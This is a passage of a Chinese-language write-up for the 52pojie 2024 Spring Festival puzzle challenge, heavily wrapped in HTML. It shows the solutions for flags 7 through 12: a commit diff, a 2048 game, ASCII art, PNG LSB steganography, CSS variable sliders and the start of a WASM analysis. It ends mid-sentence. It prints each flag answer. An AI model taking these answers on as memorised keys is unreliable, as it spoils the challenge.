src="https://https://wechat2rss.xlab.app/img-proxy/?k=e51fb269&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJxDeXq3STQaXOBx54490MKc5iaSBxQP0m5a3sJ7qG1O3km0jCJ6aIfMg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>打开提交历史，查看diff就能找到flag7</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=fa2bbbf2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ9LbFylFQ6wQibyz3y1VpoRt6dqwx6cjOAL3AfQibWDXk0hkHTS9sJXibA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag7{Djl9NQ}</code></p><h2>flag8</h2><p>回到https://2024challenge.52pojie.cn/</p><p>直接进入flag8&amp;flagB页面，可以看到是个2048游戏，flag8需要总计积分（金币）达到10000，不算太多，可以直接玩几局拿到（我大概玩了7分钟）</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=15359603&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJe20PccrO5v5NrjtEEbZ0cjVruNDtYc8nicjTNmUjaDpqQwabQ5LZuxg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="821" /></p><p><br /></p><p>直接购买并使用即可拿到</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=70cff6ea&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJN8EOySdJys5ia8eMBN4iaQukXLiajhDpg8ATx5pkrJtIMY8anHw5hKfug%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="498" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag8{OaOjIK}</code></p><h2>flag9</h2><p>和flag5同时拿到，获取流程见flag5</p><p>这里给出字符画原文</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">f.<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__.............<br />l..__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>............<br />a..<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>/\\\\\<span style="font-weight: 700;">__/\\\\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_/\\\\\\\\\_</span>__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_/\\\_</span>__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\<span style="font-weight: 700;">__/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\__</span>/\\\\\\\\\\\\\\\<span style="font-weight: 700;">____</span>_</span>/\\\\\\\\\<span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">___...........<br />g...__</span><span style="font-weight: 700;">____</span>/\\\///<span style="font-weight: 700;">__\////\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>/\\\///////\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>/\\\\\<span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">____</span>_</span>/\\\//<span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/\\\_</span>\///////\\\/////<span style="font-weight: 700;">____</span>/\\\\\\\\\\\\\<span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">__/\\\//__</span><span style="font-style: italic;">_/\\\\\<span style="font-weight: 700;">____</span>_</span>..........<br />5....<span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\\\\\\<span style="font-weight: 700;">____</span>/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\//\\\__</span><span style="font-weight: 700;">___/\\\///__</span>\/\\\<span style="font-weight: 700;">__/\\\//__</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\/////////\\\_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">__/\\\//__</span><span style="font-weight: 700;">___\////\\\__</span><span style="font-weight: 700;">__.........<br />{.....__</span>/\\\\\\\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">___/\\\\\\\\\__</span><span style="font-weight: 700;">___/\\\////\\\__</span>\//\\\<span style="font-weight: 700;">____</span>_</span>/\\\\\<span style="font-weight: 700;">____</span>\//\\\<span style="font-weight: 700;">____</span>\/\\\\\\//\\\<span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/\\\\\\\\\\\\\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\\\\//\\\_</span>__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\<span style="font-weight: 700;">____</span>_</span>........<br />P......<span style="font-style: italic;">_\////\\\//<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">__\////////\\\__</span>_</span>\//\\\\\\\\\<span style="font-weight: 700;">__<span style="font-style: italic;">_\///\\\\\\\\/\\\_</span><span style="font-style: italic;">_/\\\\\\_</span>__</span><span style="font-weight: 700;">__\/\\\//<span style="font-style: italic;">_\//\\\_</span>__</span><span style="font-style: italic;">_\/\\\/////////\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>_</span>\/\\\\\\\\\\\\\\\<span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>\/\\\//<span style="font-style: italic;">_\//\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\//\\\\\\_.......<br />3.......__</span><span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>/\\\\\\\\\\<span style="font-weight: 700;">___\///////\\\__</span><span style="font-weight: 700;">___\////////\/\\\_\/////\\\__</span><span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">__\//\\\__</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">____</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\/////////\\\_</span>\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-style: italic;">_\//\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\///__</span>......<br />p........<span style="font-weight: 700;">____</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\/////\\\<span style="font-weight: 700;">___/\\__</span><span style="font-weight: 700;">___\\\__</span>_</span>/\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\__</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">__\//\\\__</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">____</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">____</span>\/\\\<span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-style: italic;">_\//\\\<span style="font-weight: 700;">____</span>\//\\\<span style="font-weight: 700;">____</span>.....<br />r.........<span style="font-weight: 700;">____</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___/\\\\\\\\\_\//\\\\\\\\/\\_\//\\\\\\\\__</span>_</span>\//\\\\\\\\\\\/<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///\\\\\<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\//\\\_</span>\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>\/\\\\\\\\\\\\\\\<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\//\\\_</span><span style="font-style: italic;">_/\\\\\_</span>__</span><span style="font-weight: 700;">__....<br />q..........__</span><span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/////////<span style="font-weight: 700;">___\////////\//__</span>_</span>\////////<span style="font-weight: 700;">____</span><span style="font-style: italic;">_\///////////<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\/////__</span>\///<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>\///<span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span>\///////////////<span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span>\/////<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__...<br />F...........__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>..<br />}............<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_.</span></span></code></pre><p><code style="font-family: SFMono-Regular, Consolas, ;">flag9{KHTALK}</code></p><h2>flag10</h2><p>回到flag4那里下载到的<code style="font-family: SFMono-Regular, Consolas, ;">flag4_flag10.png</code></p><p>既然是一个png，png有个特点是有多个颜色通道，其余颜色通道内可能还有内容</p><blockquote><p style="margin-bottom: 15px;">思路来源：PNG - CTF Wiki (ctf-wiki.org)，LSB部分</p><p style="margin-bottom: 15px;">PNG采用LSB隐写隐藏内容也是个ctf常见套路</p></blockquote><p>这里使用一个工具Stegsolve，来查看不同颜色通道的内容</p><p>下载地址：http://www.caesum.com/handbook/Stegsolve.jar</p><p>需要有java环境，java -jar运行</p><p>打开图片，xor就能看见flag10</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b953b0ef&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJdLqblLQlNOD4m4lnwJib4HgsCkYI1Wno7hVWQntxEia3Zib8SOOlXkoSg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag10{6BxMkW}</code></p><h2>flag11</h2><p>观察网页源代码可知，要对css内两个变量取到合适的值，从而拼好图片</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ccb72419&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJial1XWl20Sv8MdW7WlzaAt77aMSUxK2uXVsVVL00namxgtUxreR5lhA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="512" /></p><p><br /></p><p>如果为了方便做题，可以考虑将网页和图片保存到本地后，在网页body内加两个拖动条来更改var1和var2，类似下方这种</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">&lt;div&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;label for=<span style="color: rgb(168, 255, 96);">"slider1"</span>&gt;</span>Variable 1:<span style="color: rgb(150, 203, 254);">&lt;/label&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;input type=<span style="color: rgb(168, 255, 96);">"range"</span> id=<span style="color: rgb(168, 255, 96);">"slider1"</span> min=<span style="color: rgb(168, 255, 96);">"0"</span> max=<span style="color: rgb(168, 255, 96);">"100"</span> value=<span style="color: rgb(168, 255, 96);">"0"</span>&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;/div&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;div&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;label for=<span style="color: rgb(168, 255, 96);">"slider2"</span>&gt;</span>Variable 2:<span style="color: rgb(150, 203, 254);">&lt;/label&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;input type=<span style="color: rgb(168, 255, 96);">"range"</span> id=<span style="color: rgb(168, 255, 96);">"slider2"</span> min=<span style="color: rgb(168, 255, 96);">"0"</span> max=<span style="color: rgb(168, 255, 96);">"100"</span> value=<span style="color: rgb(168, 255, 96);">"0"</span>&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;/div&gt;</span><br /><br /><span style="color: rgb(150, 203, 254);">&lt;script&gt;</span><br />    <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">getElementById</span>(<span style="color: rgb(168, 255, 96);">'slider1'</span>).<span style="color: rgb(255, 255, 182);">addEventListener</span>(<span style="color: rgb(168, 255, 96);">'input'</span>, <span style="color: rgb(150, 203, 254);">function</span> () {<br />        <span style="color: rgb(198, 197, 254);">document</span>.documentElement.style.<span style="color: rgb(255, 255, 182);">setProperty</span>(<span style="color: rgb(168, 255, 96);">'--var1'</span>, <span style="color: rgb(198, 197, 254);">this</span>.value);<br />    });<br /><br />    <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">getElementById</span>(<span style="color: rgb(168, 255, 96);">'slider2'</span>).<span style="color: rgb(255, 255, 182);">addEventListener</span>(<span style="color: rgb(168, 255, 96);">'input'</span>, <span style="color: rgb(150, 203, 254);">function</span> () {<br />        <span style="color: rgb(198, 197, 254);">document</span>.documentElement.style.<span style="color: rgb(255, 255, 182);">setProperty</span>(<span style="color: rgb(168, 255, 96);">'--var2'</span>, <span style="color: rgb(198, 197, 254);">this</span>.value);<br />    });<br /><span style="color: rgb(150, 203, 254);">&lt;/script&gt;</span></code></pre><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f37a32ea&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJNsNodovc1Q53X4REQ4VP9KQS0fhOjRvGGqQxeCSibhC4HNdaa43dJ5w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>最终结果：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">:root</span> {<br />    --var1: <span style="color: rgb(255, 115, 253);">71</span>;<br />    --var2: <span style="color: rgb(255, 115, 253);">20</span>;<br />}</code></pre><p><code style="font-family: SFMono-Regular, Consolas, ;">flag11{HPQfVF}</code></p><h2>flag12</h2><p>来到flag12页面</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5a7786f7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ7sr7A1yhIHBSTjHc0OiadvG8wTPYc4as9lTlFUP8eAJMmqAsA3Gjx3w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>看网络请求了个wasm就可以猜到这题要进行wasm逆向了</p><p>先看网页里的js逻辑</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=72c10e68&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJNOubkF9R1gsOVZlmlbwWYo57sAy9a9ia70TxssI5mwnaGUJTicEX5KuA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="874" /></p><p><br /></p><p>大致思路就是调用wasm里get_flag12函数拿到一个num，然后经过一些运算变成flag12</p><p>所以问题的关键就是拿到wasm内该函数的返回值</p><p>我不懂wasm，这里求助了GPT，尝试分析wasm的代码</p><blockquote><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(module</code> - 表示代码开始定义一个wasm模块。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(memory $memory (;0;) (export "memory") 16)</code> - 这行代码定义了一个名为$memory的内存，并将其导出为"memory"。16表示分配了16个WebAssembly 页面的内存，每个页面大小为64KiB，所以总共分配了1MiB (16 * 64KiB) 的内存空间。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(global $__stack_pointer (;0;) (mut i32) (i32.const 1048576))</code> - 定义了一个名为$__stack_pointer的全局变量，为可变的32位整数(i32)，初始值为1048576。这通常表示栈指针的起始位置。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(global $__data_end (;1;) (export "__data_end") i32 (i32.const 1048576))</code> - 定义并导出了名为"__data_end"的全局变量，它是一个32位整数值，初始值同样为1048576。这个变量标记了数据段的结束位置。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(global $__heap_base (;2;) (export "__heap_base") i32 (i32.const 1048576))</code> - 定义并导出了一个叫"__heap_base"的全局变量。它的值也是1048576，标识了堆的起始地址。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(func $get_flag12 (;0;) (export "get_flag12") (param $var0 i32) (result i32)</code> - 这里定义了一个名为<code style="font-family: SFMono-Regular, Consolas, ;">get_flag12</code>的函数，并将其导出。该函数接受一个i32类型的参数<code style="font-family: SFMono-Regular, Consolas, ;">var0</code>，并返回一个i32类型的结果。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.const 1213159497</code> - 在函数内部，首先将常数1213159497压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.const 0</code> - 紧接着将常数0压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">local.get $var0</code> - 获取传入的参数"$var0"的值，并压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.const 1103515245</code> - 将常数1103515245压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.mul</code> - 将栈顶的两个i32类型的值相乘（即常数1103515245和参数"$var0"的值），并将结果压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.const 1</code> - 将常数1压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.eq</code> - 